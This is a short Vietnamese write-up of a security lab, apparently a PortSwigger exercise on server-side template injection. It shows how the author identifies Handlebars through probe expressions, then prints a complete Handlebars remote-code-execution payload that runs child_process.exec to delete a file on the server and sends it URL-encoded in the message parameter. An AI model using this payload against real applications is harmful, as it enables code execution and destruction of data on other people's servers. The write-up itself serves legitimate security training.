# Server-side template injection in an unknown language with a documented exploit

Truy cập mặt hàng đầu tiên thấy rằng máy chủ gửi một thông báo message rằng sản phẩm không có sẵn:

![image](https://user-images.githubusercontent.com/68894302/179435790-f0a86125-c997-45f6-b00e-4fa1e851b04c.png)

Message hiển thị luôn trên URL

![image](https://user-images.githubusercontent.com/68894302/179435807-7d5e3984-80b7-4217-8cd0-57a81a2b82b4.png)



Đặt template như sau và  sau đó kiểm tra template bên phản hồi

![image](https://user-images.githubusercontent.com/68894302/179436485-43724b7e-37a5-439f-af54-caae151d9c80.png)

`{ this }` -> `[object Object]`

`{{ this.__proto__ }}` -> `[object Object]`

`{{ this.__proto__.constructor.name }}` -> Không có gì

Template engine đang được sử dụng có lẽ là **Handlebars** 

![image](https://user-images.githubusercontent.com/68894302/179435909-d1e4ad87-1920-4daf-b7e5-eb6efc630ccb.png)

Sau khi tìm kiếm google chúng ta thấy rằng có thể thực thi mã từ xa bằng payload sau:

``` 
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('rm -f /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

URL encoded và gửi request

![image](https://user-images.githubusercontent.com/68894302/179438525-9719df49-6492-4d66-b47a-f8f0dbc8d8e4.png)